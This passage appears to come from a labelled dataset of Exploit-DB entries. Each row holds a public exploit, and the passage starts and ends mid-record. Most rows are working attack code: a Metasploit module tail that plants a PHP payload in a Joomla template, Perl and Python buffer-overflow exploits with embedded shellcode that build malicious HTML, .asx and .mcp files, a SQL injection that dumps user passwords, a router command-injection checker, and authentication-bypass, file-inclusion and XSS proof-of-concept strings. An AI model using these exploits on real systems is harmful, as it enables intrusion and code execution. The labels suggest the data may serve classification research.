=~ /(\/templates\/.*\/)template_preview.png/         template_path = $1         print_status(""#{peer} - Template path [ #{template_path} ] retrieved"")       else         fail_with(Failure::Unknown, ""#{peer} - Unable to retrieve template path"")       end      else       fail_with(Failure::Unknown, ""#{peer} - Creating file failed"")     end      filename_base64 = Rex::Text.encode_base64(""/#{filename}.php"")      # Inject payload data into file     print_status(""#{peer} - Insert payload into file [ #{filename}.php ]"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'view' => 'template',         'id' => template_id,         'file' => filename_base64,         },       'vars_post' => {         'jform[source]' => payload.encoded,         'task' => 'template.apply',         token => '1',         'jform[extension_id]' => template_id,         'jform[filename]' => ""/#{filename}.php""       }       })      if res && res.code == 303 && res.headers['Location'] =~ /\/administrator\/index.php\?option=com_templates&view=template&id=#{template_id}&file=/       print_status(""#{peer} - Payload data inserted into [ #{filename}.php ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Could not insert payload into file [ #{filename}.php ]"")     end      # Request payload     register_files_for_cleanup(""#{filename}.php"")     print_status(""#{peer} - Executing payload"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, template_path, ""#{filename}.php""),       'cookie'  => auth_cookie     })    end  end",.tr,0
6116,"IntelliTamper 2.0.7 - HTML Parser Remote Buffer Overflow #!/usr/bin/perl #  use warnings; use strict;  # CMD=""c:\windows\system32\calc.exe"" # [*] x86/alpha_mixed succeeded, final size 344 my $shellcode =  ""\xda\xc3\xd9\x74\x24\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"" . ""\x4a\x4a\x43\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41\x58"" . ""\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"" . ""\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c"" . ""\x4d\x38\x47\x34\x45\x50\x43\x30\x43\x30\x4c\x4b\x51\x55\x47"" . ""\x4c\x4c\x4b\x43\x4c\x44\x45\x42\x58\x45\x51\x4a\x4f\x4c\x4b"" . ""\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x45\x51\x4a\x4b\x50"" . ""\x49\x4c\x4b\x47\x44\x4c\x4b\x45\x51\x4a\x4e\x46\x51\x49\x50"" . ""\x4d\x49\x4e\x4c\x4b\x34\x49\x50\x43\x44\x43\x37\x49\x51\x49"" . ""\x5a\x44\x4d\x45\x51\x49\x52\x4a\x4b\x4c\x34\x47\x4b\x51\x44"" . ""\x47\x54\x45\x54\x43\x45\x4d\x35\x4c\x4b\x51\x4f\x47\x54\x45"" . ""\x51\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f"" . ""\x45\x4c\x45\x51\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x43\x31\x4a"" . ""\x4b\x4c\x49\x51\x4c\x51\x34\x43\x34\x48\x43\x51\x4f\x50\x31"" . ""\x4c\x36\x45\x30\x51\x46\x42\x44\x4c\x4b\x51\x56\x46\x50\x4c"" . ""\x4b\x47\x30\x44\x4c\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b"" . ""\x45\x38\x43\x38\x4b\x39\x4c\x38\x4c\x43\x49\x50\x43\x5a\x50"" . ""\x50\x43\x58\x4a\x50\x4d\x5a\x45\x54\x51\x4f\x42\x48\x4c\x58"" . ""\x4b\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4a\x47\x42\x43\x46"" . ""\x5a\x51\x4c\x42\x57\x42\x49\x42\x4e\x42\x44\x42\x4f\x42\x57"" . ""\x43\x43\x51\x4c\x43\x43\x44\x39\x43\x43\x43\x44\x43\x55\x42"" . ""\x4d\x47\x43\x50\x32\x51\x4c\x43\x53\x45\x31\x42\x4c\x42\x43"" . ""\x46\x4e\x45\x35\x44\x38\x42\x45\x43\x30\x45\x5a\x41\x41"";    my $evil_html	=	'<html><head><title>ph33r</title></head><body>' . 			#'<a href=""http://AAAAAAAAAA' . 			#""\x41"" x 450 . 			'<a href=""http://' . 			$shellcode . 			""\x41"" x 116 . 			""\x39\x5c\x3d\x7e"" . # ascii friendly 'call EBX' 			'.htm"">ph33r</a>' . 			""</body></html>"";  print $evil_html;  # milw0rm.com [2008-07-22]",IntelliTamper,1
4681,"ftp Admin 0.1.0 - Local File Inclusion / Cross-Site Scripting / Authentication Bypass FTP Admin v0.1.0 - MULTIPLE VULNERABILITIES 	by Omni  1) Infos --------- Date            : 2007-11-28 Product         : FTP Admin Version         : v0.1.0 Vendor          : http://sourceforge.net/projects/ftpadmin/ Vendor Status   : 2007-11-30 Informed!  Description     : FTP admin is a web-based user administration tool, for usage in combination with vsftpd. FTP admin                   requires sudo. Features include modification of users and generation of user passwords.  Source          : omnipresent - omni E-mail          : omnipresent[at]NOSPAMemail[dot]it - omni[at]NOSPAMplayhack[dot]net Team            : Playhack.net Security  2) Security Issues -------------------  --- [ XSS ] --- ===============================================  I think that is better let you see a PoC instead of explain where is the bug.. If you want to know it just look at the  source code.  --- [ PoC ] --- ===============  http://localhost/ft/index.php?page=error&error=<b>...</b> http://localhost/ft/index.php?page=error&error=<script>alert(1)</script>   --- [ Local File Inclusion ] --- ================================  Take a look in index.php, line 49: include(""$page.php"");  Remembe that you have to log in to made local file inclusion (loggedin = true -> register_global = On)  [ Remembe that ] if(!is_file($page . "".php"") || (!is_readable($page . "".php""))) { 		$page = ""error""; 		$error = ""Page does not exist or is not readable\n""; 	} } [ /Remembe that ]  --- [ PoC ] --- ===============  http://localhost/ft/index.php?page=pass.txt%00&loggedin=true  To see pass.txt ...  --- [ Admin Bypass ] --- ================================  Today I'm too lazy to explain what's wrong.. so take a look in the source code and watch the var $loggedin !!  --- [ PoC ] --- ===============  To add a user...  http://localhost/ft/index.php?page=add&loggedin=true  # milw0rm.com [2007-11-29]",vsftpd,1
7713,"VUPlayer 2.49 - '.asx' HREF Local Buffer Overflow (2) #!/usr/bin/perl -w   # author : Houssamix  # VUPlayer 2.49 (.asx File) local Stack Overflow Exploit  print "" ######################################################################## #~ Author   : HouSSamix                                                # #~ Program  : VUPlayer                                                 # #~ Version  : 2.49                                                     # #~ website  : http://www.vuplayer.com/                                 # #~ Download : http://vuplayer.com/files/vuplayersetup.exe              # #~ Type     : (.asx File) local Stack Overflow Exploit                 # ########################################################################\n""; ################################################################### $BOF = ""\x3C\x41\x53\x58\x20\x56\x45\x52\x53\x49\x4F\x4E\x3D\x22\x33\x2E"". ""\x30\x22\x3E\x0A\x0D\x0A\x3C\x45\x4E\x54\x52\x59\x3E\x0A\x3C\x54"". ""\x49\x54\x4C\x45\x3E\x50\x72\x4F\x20\x53\x70\x59\x3C\x2F\x54\x49"". ""\x54\x4C\x45\x3E\x0A\x0D\x0A\x3C\x52\x45\x46\x20\x48\x52\x45\x46"". ""\x3D\x22\x6D\x51\x47\x69\x42\x45\x67\x30\x33\x70\x55\x52\x42\x41"". ""\x44\x55\x56\x77\x4A\x75\x4B\x53\x51\x2B\x73\x4D\x45\x6C\x34\x78"". ""\x43\x5A\x75\x77\x42\x75\x6A\x53\x53\x58\x4A\x69\x30\x62\x46\x6B"". ""\x32\x31\x49\x34\x66\x75\x30\x69\x70\x64\x56\x34\x68\x41\x31\x32"". ""\x45\x49\x4F\x6D\x34\x69\x41\x34\x30\x70\x48\x39\x72\x50\x69\x43"". ""\x48\x6B\x65\x41\x52\x71\x50\x75\x6A\x4F\x71\x6C\x78\x63\x4D\x6E"". ""\x52\x51\x68\x39\x62\x43\x32\x2B\x75\x53\x34\x4D\x54\x67\x63\x2B"". ""\x46\x38\x52\x33\x62\x62\x51\x56\x65\x61\x57\x36\x6E\x38\x6C\x5A"". ""\x2B\x48\x51\x59\x57\x5A\x4D\x77\x57\x41\x72\x30\x31\x4C\x61\x5A"". ""\x38\x64\x64\x57\x37\x38\x59\x69\x58\x45\x49\x75\x5A\x47\x71\x72"". ""\x62\x37\x69\x6D\x62\x57\x79\x6B\x4B\x70\x45\x68\x52\x34\x41\x71"". ""\x73\x78\x6C\x6F\x6D\x73\x5A\x74\x37\x73\x33\x77\x43\x67\x6A\x72"". ""\x69\x47\x75\x62\x48\x78\x5A\x79\x37\x70\x75\x63\x6A\x63\x36\x37"". ""\x77\x52\x43\x79\x5A\x31\x4A\x66\x6B\x44\x2F\x33\x55\x4D\x53\x48"". ""\x2F\x53\x32\x4B\x35\x68\x79\x62\x34\x33\x38\x4E\x32\x4E\x43\x4B"". ""\x7A\x79\x74\x61\x79\x4E\x69\x52\x50\x63\x65\x57\x4B\x50\x6D\x4F"". ""\x73\x2F\x4D\x51\x6F\x38\x75\x55\x5A\x35\x43\x52\x2B\x35\x54\x34"". ""\x55\x51\x59\x75\x2B\x53\x4D\x62\x75\x69\x75\x6D\x31\x78\x78\x48"". ""\x64\x47\x62\x54\x33\x5A\x6F\x63\x63\x6E\x61\x4C\x65\x72\x77\x41"". ""\x36\x38\x56\x52\x30\x55\x50\x4E\x76\x62\x66\x64\x45\x64\x74\x44"". ""\x43\x4F\x4A\x49\x51\x44\x4A\x66\x72\x34\x45\x6F\x56\x77\x6E\x6F"". ""\x49\x45\x43\x57\x73\x57\x38\x37\x6F\x59\x41\x61\x36\x72\x4D\x38"". ""\x65\x46\x53\x70\x6C\x42\x63\x6F\x4E\x68\x74\x34\x6D\x4E\x74\x54"". ""\x35\x74\x6B\x66\x41\x64\x47\x6D\x66\x66\x54\x4F\x52\x73\x4B\x54"". ""\x65\x54\x71\x68\x79\x71\x41\x2F\x30\x57\x39\x49\x79\x41\x70\x4A"". ""\x34\x6B\x6A\x4C\x53\x4C\x32\x7A\x31\x4B\x4B\x67\x33\x67\x31\x6C"". ""\x65\x63\x58\x66\x7A\x6F\x55\x32\x43\x68\x34\x66\x76\x68\x31\x54"". ""\x44\x6D\x68\x34\x57\x39\x69\x37\x42\x72\x6B\x38\x70\x61\x2B\x38"". ""\x32\x79\x49\x57\x38\x79\x44\x34\x56\x78\x30\x37\x4C\x57\x49\x39"". ""\x4D\x32\x5A\x59\x56\x2F\x63\x68\x72\x48\x35\x4D\x66\x56\x4D\x47"". ""\x62\x6C\x56\x4D\x73\x32\x53\x61\x51\x63\x47\x41\x6E\x67\x51\x72"". ""\x71\x35\x43\x38\x5A\x6B\x31\x68\x79\x65\x44\x70\x36\x54\x75\x46"". ""\x56\x39\x55\x47\x4B\x59\x73\x6F\x65\x4C\x6B\x38\x53\x71\x39\x6F"". ""\x58\x63\x5A\x4F\x4C\x42\x50\x70\x67\x4B\x31\x6F\x4E\x35\x63\x65"". ""\x47\x77\x38\x30\x70\x31\x4B\x4C\x4C\x4D\x33\x57\x47\x73\x55\x6E"". ""\x36\x64\x6E\x62\x51\x63\x62\x57\x6C\x73\x64\x7A\x42\x79\x62\x53"". ""\x41\x38\x63\x33\x56\x69\x62\x57\x6C\x30\x51\x47\x31\x70\x62\x48"". ""\x63\x77\x63\x6D\x30\x75\x59\x32\x39\x74\x50\x6F\x68\x67\x42\x42"". ""\x4D\x52\x41\x67\x41\x67\x42\x51\x4A\x49\x4E\x4E\x36\x56\x41\x68"". ""\x73\x44\x42\x67\x73\x4A\x43\x41\x63\x44\x41\x67\x51\x56\x41\x67"". ""\x67\x44\x42\x42\x59\x43\x41\x77\x45\x43\x48\x67\x45\x43\x46\x34"". ""\x41\x41\x43\x67\x6B\x51\x6E\x55\x35\x2B\x76\x33\x57\x47\x38\x6F"". ""\x59\x79\x7A\x67\x43\x5A\x41\x57\x74\x55\x68\x4D\x6C\x76\x7A\x78"". ""\x35\x43\x6A\x74\x55\x79\x41\x42\x2F\x72\x6D\x69\x4B\x63\x6F\x2F"". ""\x41\x41\x6E\x41\x39\x48\x63\x46\x6D\x6C\x39\x37\x36\x65\x5A\x64"". ""\x56\x64\x62\x5A\x6F\x75\x35\x44\x6E\x58\x6D\x79\x2F\x47\x75\x51"". ""\x51\x4E\x42\x45\x67\x30\x33\x77\x38\x51\x45\x41\x43\x43\x35\x47"". ""\x54\x34\x30\x73\x76\x7A\x5A\x59\x4A\x4B\x59\x6D\x39\x64\x51\x46"". ""\x6E\x76\x75\x54\x6B\x56\x68\x52\x72\x79\x50\x73\x65\x4A\x76\x33"". ""\x58\x6D\x44\x67\x52\x42\x42\x70\x64\x45\x74\x63\x74\x33\x79\x50"". ""\x35\x63\x4F\x61\x47\x31\x41\x6E\x62\x56\x32\x6D\x32\x79\x50\x79"". ""\x6C\x6C\x6E\x78\x4A\x41\x61\x74\x7A\x52\x6C\x70\x58\x59\x73\x32"". ""\x61\x2B\x6C\x32\x37\x41\x64\x32\x65\x46\x6F\x4C\x6C\x45\x68\x31"". ""\x39\x38\x6D\x6A\x56\x50\x75\x66\x59\x4C\x62\x6B\x71\x35\x42\x74"". ""\x33\x53\x39\x41\x2B\x46\x36\x69\x58\x68\x51\x72\x2B\x4A\x54\x58"". ""\x4D\x41\x54\x50\x44\x48\x67\x34\x43\x2F\x39\x71\x66\x79\x52\x62"". ""\x63\x55\x68\x70\x35\x57\x61\x61\x4E\x5A\x42\x6D\x51\x49\x31\x32"". ""\x34\x6F\x6D\x4E\x5A\x5A\x54\x4C\x56\x4C\x34\x72\x49\x62\x4C\x73"". ""\x56\x49\x77\x33\x77\x79\x4C\x31\x5A\x44\x71\x4D\x38\x72\x72\x73"". ""\x54\x51\x41\x57\x72\x61\x47\x35\x6A\x79\x73\x37\x5A\x37\x65\x69"". ""\x78\x49\x6B\x64\x64\x58\x37\x36\x73\x6D\x6E\x4D\x78\x53\x56\x67"". ""\x50\x6A\x63\x77\x5A\x6B\x49\x43\x37\x49\x2F\x2B\x2F\x41\x4C\x61"". ""\x4C\x69\x4F\x41\x74\x31""; $ECX = ""\x43\x43\x43\x43""; $nops = ""\x33\x33\x33\x37\x34\x6D\x49\x4D\x4F\x70\x4E\x42""; $EIP = ""\x5D\x38\x82\x7C"" ; # EIP  $c =	""\x90"" x 36 ;     # u can change this shellcode but dont forget to use Encoder=PexAlphaNum  # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com my $shellcode = ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"". ""\x42\x30\x42\x50\x42\x30\x4b\x58\x45\x34\x4e\x43\x4b\x48\x4e\x37"". ""\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x58"". ""\x4f\x55\x42\x42\x41\x50\x4b\x4e\x49\x34\x4b\x58\x46\x53\x4b\x38"". ""\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"". ""\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x33\x46\x35\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x58"". ""\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x54"". ""\x4b\x38\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38"". ""\x41\x50\x4b\x4e\x49\x48\x4e\x55\x46\x32\x46\x50\x43\x4c\x41\x43"". ""\x42\x4c\x46\x56\x4b\x48\x42\x34\x42\x53\x45\x58\x42\x4c\x4a\x57"". ""\x4e\x30\x4b\x48\x42\x44\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"". ""\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x58\x42\x58\x42\x4b"". ""\x42\x30\x42\x30\x42\x30\x4b\x58\x4a\x46\x4e\x43\x4f\x45\x41\x43"". ""\x48\x4f\x42\x46\x48\x35\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x47"". ""\x42\x35\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x35\x4a\x36\x4a\x39"". ""\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x36"". ""\x4e\x56\x43\x36\x42\x50\x5a"";  $cc =	""\x90"" x 7687 ;   $asx =  ""\x2E\x61\x73\x66\x22\x2F\x3E\x0A\x3C\x2F\x45\x4E\x54\x52\x59\x3E"".         ""\x0A\x3C\x2F\x41\x53\x58\x3E\x0A"";  $file=""houssamix.asx""; open($FILE, "">$file""); $exp = $BOF.$ECX.$nops.$EIP.$c.$shellcode.$cc.$asx; print $FILE $exp; close($FILE);  print "" ################################ File exploit created open it with vuplayer ################################ Exploit by Houssamix \n\n"";  # milw0rm.com [2009-01-09]",.vuplayer.,1
6870,"MW6 Aztec - ActiveX 'Aztec.dll' Remote Insecure Method ï»¿<!-- By Dr.Pantagon DeltaSecurityCenter www.DeltaSecurity.ir Description : Aztec ActiveX ver : 3.0.0.1 CopyRight : MW6 Technologies, Inc.  Download Link : http://www.mw6tech.com/aztec/MW6Aztec.ZIP   This was written for educational purpose. Use it at your own risk.  Author will be not responsible for any damage.   Tested on Windows XP Professional SP2 all patched, with Internet Explorer 6   This control contains two methods SaveAsBMP(); And SaveAsWMF();  Sub SaveAsWMF (  	ByVal FileName  As String  )  AND  Sub SaveAsWMF (  	ByVal FileName  As String  ) you can see this problem to all product this company --> <html> Test Exploit page <object classid='clsid:F359732D-D020-40ED-83FF-F381EFE36B54' id='target' ></object> <script language='vbscript'>  targetFile = ""C:\WINDOWS\system32\Aztec.dll"" prototype  = ""Sub SaveAsBMP ( ByVal FileName As String )"" memberName = ""SaveAsBMP"" progid     = ""AZTECLib.MW6Aztec"" argCount   = 1  arg1=""c:\windows\system_.ini""  target.SaveAsBMP arg1  'target.SaveAsWMF arg1    </script>  # milw0rm.com [2008-10-29]",.DeltaSecurity.ir,1
8656,"MPLAB IDE 8.30 - '.mcp' Universal Overwrite (SEH) # usage: mplab.py then open the project file :) # Download : http://ww1.microchip.com/downloads/en/DeviceDoc/MPLAB_8.30.zip (nadli chouk fi rassi :p) print ""**************************************************************************"" print "" MPLAB IDE 8.30 (.mcp) Universal Seh Overwrite Exploit\n"" print "" Refer : Secunia advisory (35054)\n"" print "" Exploit code: His0k4\n"" print "" Tested on: Windows XP Pro SP3 (EN)\n"" print "" Greetings to:"" print "" All friends & muslims HaCkers(dz),snakespc.com\n"" print ""**************************************************************************""          	  header1 = ( ""\x5b\x48\x45\x41\x44\x45\x52\x5d\x0d\x0a\x6d\x61\x67\x69\x63\x5f"" ""\x63\x6f\x6f\x6b\x69\x65\x3d\x7b\x36\x36\x45\x39\x39\x42\x30\x37"" ""\x2d\x45\x37\x30\x36\x2d\x34\x36\x38\x39\x2d\x39\x45\x38\x30\x2d"" ""\x39\x42\x32\x35\x38\x32\x38\x39\x38\x41\x31\x33\x7d\x0d\x0a\x66"" ""\x69\x6c\x65\x5f\x76\x65\x72\x73\x69\x6f\x6e\x3d\x31\x2e\x30\x0d"" ""\x0a\x5b\x50\x41\x54\x48\x5f\x49\x4e\x46\x4f\x5d\x0d\x0a\x64\x69"" ""\x72\x5f\x73\x72\x63\x3d\x0d\x0a\x64\x69\x72\x5f\x62\x69\x6e\x3d"" ""\x0d\x0a\x64\x69\x72\x5f\x74\x6d\x70\x3d\x0d\x0a\x64\x69\x72\x5f"" ""\x73\x69\x6e\x3d\x0d\x0a\x64\x69\x72\x5f\x69\x6e\x63\x3d\x0d\x0a"" ""\x64\x69\x72\x5f\x6c\x69\x62\x3d\x0d\x0a\x64\x69\x72\x5f\x6c\x6b"" ""\x72\x3d\x0d\x0a\x5b\x43\x41\x54\x5f\x46\x49\x4c\x54\x45\x52\x53"" ""\x5d\x0d\x0a\x66\x69\x6c\x74\x65\x72\x5f\x73\x72\x63\x3d\x2a\x2e"" ""\x61\x73\x6d\x0d\x0a\x66\x69\x6c\x74\x65\x72\x5f\x69\x6e\x63\x3d"" ""\x2a\x2e\x68\x3b\x2a\x2e\x69\x6e\x63\x0d\x0a\x66\x69\x6c\x74\x65"" ""\x72\x5f\x6f\x62\x6a\x3d\x2a\x2e\x6f\x0d\x0a\x66\x69\x6c\x74\x65"" ""\x72\x5f\x6c\x69\x62\x3d\x2a\x2e\x6c\x69\x62\x0d\x0a\x66\x69\x6c"" ""\x74\x65\x72\x5f\x6c\x6b\x72\x3d\x2a\x2e\x6c\x6b\x72\x0d\x0a\x5b"" ""\x53\x55\x49\x54\x45\x5f\x49\x4e\x46\x4f\x5d\x0d\x0a\x73\x75\x69"" ""\x74\x65\x5f\x67\x75\x69\x64\x3d\x7b\x36\x42\x33\x44\x41\x41\x37"" ""\x38\x2d\x35\x39\x43\x31\x2d\x34\x36\x44\x44\x2d\x42\x36\x41\x41"" ""\x2d\x44\x42\x44\x41\x45\x34\x45\x30\x36\x34\x38\x34\x7d\x0d\x0a"" ""\x73\x75\x69\x74\x65\x5f\x73\x74\x61\x74\x65\x3d\x0d\x0a\x5b\x54"" ""\x4f\x4f\x4c\x5f\x53\x45\x54\x54\x49\x4e\x47\x53\x5d\x0d\x0a\x54"" ""\x53\x7b\x42\x46\x44\x32\x37\x46\x42\x41\x2d\x34\x41\x30\x32\x2d"" ""\x34\x43\x30\x45\x2d\x41\x35\x45\x35\x2d\x42\x38\x31\x32\x46\x33"" ""\x45\x37\x37\x30\x37\x43\x7d\x3d\x2f\x6f\x22"")  header2 = ( ""\x2e\x63\x6f\x66\x22\x0d\x0a\x54\x53\x7b\x41\x44\x45\x39\x33\x41"" ""\x35\x35\x2d\x43\x37\x43\x37\x2d\x34\x44\x34\x44\x2d\x41\x34\x42"" ""\x41\x2d\x35\x39\x33\x30\x35\x46\x37\x44\x30\x33\x39\x31\x7d\x3d"" ""\x0d\x0a"")   # win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com shellcode=( ""\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x79"" ""\x1f\x8c\x11\x83\xeb\xfc\xe2\xf4\x85\xf7\xc8\x11\x79\x1f\x07\x54"" ""\x45\x94\xf0\x14\x01\x1e\x63\x9a\x36\x07\x07\x4e\x59\x1e\x67\x58"" ""\xf2\x2b\x07\x10\x97\x2e\x4c\x88\xd5\x9b\x4c\x65\x7e\xde\x46\x1c"" ""\x78\xdd\x67\xe5\x42\x4b\xa8\x15\x0c\xfa\x07\x4e\x5d\x1e\x67\x77"" ""\xf2\x13\xc7\x9a\x26\x03\x8d\xfa\xf2\x03\x07\x10\x92\x96\xd0\x35"" ""\x7d\xdc\xbd\xd1\x1d\x94\xcc\x21\xfc\xdf\xf4\x1d\xf2\x5f\x80\x9a"" ""\x09\x03\x21\x9a\x11\x17\x67\x18\xf2\x9f\x3c\x11\x79\x1f\x07\x79"" ""\x45\x40\xbd\xe7\x19\x49\x05\xe9\xfa\xdf\xf7\x41\x11\xef\x06\x15"" ""\x26\x77\x14\xef\xf3\x11\xdb\xee\x9e\x7c\xed\x7d\x1a\x1f\x8c\x11"") 	 buff = ""\x41"" * (226-len(shellcode)) next_seh = ""\x74\xc9\x41\x42"" seh = ""\x12\x13\x40\x00"" #p/p/r MPLAB.exe nops1 = ""\x90""*20 nops2 = ""\x90""*28 mshellcode = ""\xE9\x47\xFF\xFF\xFF"" #welli 3liya :p  exploit = header1 + buff + shellcode + nops1 + mshellcode + nops2 + next_seh + seh + header2  try:     out_file = open(""exploit.mcp"",'w')     out_file.write(exploit)     out_file.close()     raw_input(""\nExploit file created!\n"") except:     print ""Error""  # milw0rm.com [2009-05-11]",MPLAB,1
5031,"Mambo Component Restaurant 1.0 - SQL Injection ######################################################################### # # joomla SQL Injection(com_restaurant) # ######################################################################### # # AUTHOR : S@BUN # # HOME : http://www.hackturkiye.com/  ######################################################################### # # DorKs 1 : allinurl: ""com_restaurant"" # ######################################################################## EXPLOIT :  index.php?option=com_restaurant&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,username/**/from/**/mos_users/*   ######################################################################### # S@BUN                  www.hackturkiye.com                       S@BUN ######################################################################### # S@BUN                     GOOD LUCKY                               S@BUN #########################################################################    <name>Restaurant</name>   <creationDate>02-05-2005</creationDate>   <author>1100cc</author>   <copyright>This component is released under the GNU/GPL License</copyright>   <authorEmail>webmaster@1100cc.nl</authorEmail>    <authorUrl>www.1100cc.nl</authorUrl>   <version>1.0</version>   <description>Restaurant is a fully integrated Mambo component.</description>  # milw0rm.com [2008-01-31]",.hackturkiye.,0
39431,"Adobe Photoshop CC / Bridge CC - '.iff' Parsing Memory Corruption #####################################################################################  Application: Adobe Photoshop CC & Bridge CC IFF file parsing memory corruption  Platforms: Windows  Versions: Bridge CC 6.1.1 and earlier versions  Version: Photoshop CC 16.1.1 (2015.1.1) and earlier versions  CVE; 2016-0953  Author: Francis Provencher of COSIG  Twitter: @COSIG_  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #####################################################################################  =============== 1) Introduction ===============  Adobe Photoshop is a raster graphics editor developed and published by Adobe Systems for Windows and OS X.  (https://en.wikipedia.org/wiki/Adobe_Photoshop)  #####################################################################################  ============================ 2) Report Timeline ============================  2015-11-11: Francis Provencher from COSIG report the issue to PSIRT (ADOBE);  2016-02-09: Adobe release a patch (APSB16-03);  2016-02-09: COSIG release this advisory;  #####################################################################################  ============================ 3) Technical details ============================  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Photoshop CC & Bridge CC. User interaction is required to exploit this vulnerability in that the target must open a malicious file. By providing a malformed IFF file, an attacker can cause an heap memory corruption. An attacker could leverage this to execute arbitrary code under the context of the application.  #####################################################################################  ===========  4) POC  ===========  http://protekresearchlab.com/exploits/COSIG-2016-10.iff  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39431.zip  ###############################################################################",Adobe,1
43363,"Linksys WVBR0 - 'User-Agent' Remote Command Injection #!/usr/bin/python # -*- coding: utf-8 -*-  # Author: Nixawk # CVE-2017-17411 # Linksys WVBR0 25 Command Injection  """""" $ python2.7 exploit-CVE-2017-17411.py [*] Usage: python exploit-CVE-2017-17411.py <URL>  $ python2.7 exploit-CVE-2017-17411.py http://example.com/ [+] Target is exploitable by CVE-2017-17411 """"""  import requests   def check(url):     payload = '""; echo ""admin'     md5hash = ""456b7016a916a4b178dd72b947c152b7""  # echo ""admin"" | md5sum      resp = send_http_request(url, payload)      if not resp:         return False      lines = resp.text.splitlines()     sys_cmds = filter(lambda x: ""config.webui sys_cmd"" in x, lines)      if not any([payload in sys_cmd for sys_cmd in sys_cmds]):         return False      if not any([md5hash in sys_cmd for sys_cmd in sys_cmds]):         return False      print(""[+] Target is exploitable by CVE-2017-17411 "")     return True   def send_http_request(url, payload):     headers = {         'User-Agent': payload     }      response = None     try:         response = requests.get(url, headers=headers)     except Exception as err:         log.exception(err)      return response   if __name__ == '__main__':     import sys      if len(sys.argv) != 2:         print(""[*] Usage: python %s <URL>"" % sys.argv[0])         sys.exit(0)      check(sys.argv[1])   # google dork: ""Vendor:LINKSYS ModelName:WVBR0-25-US""  ## References  # https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair # https://thehackernews.com/2017/12/directv-wvb-hack.html",.thezdi.,0
12411,"FreeRealty(Free Real Estate Listing Software) - Authentication Bypass # Exploit Title: Authentication bypass in FreeRealty(Free Real Estate Listing Software) # Date: 27-apr-2010 # Author: Sid3^effects # Software Link: N/a # CVE : [] # Code : []                   ______________________________________________________________________________                               Authentication bypass in FreeRealty                        Vendor:http://freerealty.rwcinc.net/       ___________________________Author:Sid3^effects_________________________________     Description :   Free Realty  is primarily designed for real estate agents and offices to list properties on the internet. With Free Realty the end user does not need to be fluent in web page design.    script cost :Free --------------------------------------------------------------------------- 	* Authentication bypass:  	The following script has authentication bypass.  	use ' or 1=1 or ''=' in both login and password.  DEMO :http://[site]/demo/agentadmin.php   ShoutZ : -------                 ---Indian Cyber warriors--Andhra hackers--   Greetz : --------  ---*L0rd ÇrusAdêr*---d4rk-blu™® [ICW]---R45C4L idi0th4ck3r---CR4C|< 008---M4n0j--",FreeRealty(Free,1
4742,"WFTPD Explorer Pro 1.0 - Remote Heap Overflow (PoC) ########################################## #  WftpdExpPro_HeapPoC.py                # #  Discovered by r4x (Kamil Szczerba)    # #                      [r4xks@o2.pl]     # ########################################## # Soft    : WFTPD Explorer Pro 1.0       # # Vendor  : Texas Imperial Software      # # Vuln    : Heap Overwlow (Res: LIST)    # # Exploit : PoC Reg Overwrite            # ########################################## # Reg:                                   # #  EAX = 41414141                        # #  ECX = 41414141                        # #  EDX = 00a57b38 ASCII ""AAAA...""        # #  ESI = 00a57b30 ASCII ""AAAA...""        # #  ------------------------------        # #  EIP = 7c91142E                        # #                                        # #  Exception c0000005 (ACCES_VIOLATION)  # #                                        # # MOV DWORD PTR DS:[ECX],EAX    ; HEHE   # # MOV DWORD PTR DS:[EAX +4] ECX ;        # #                                        # # Test on: WinXPsp2 Polish 		 # #                                        # ##########################################     from socket import *  heapb0f = ""A"" * 1200 + 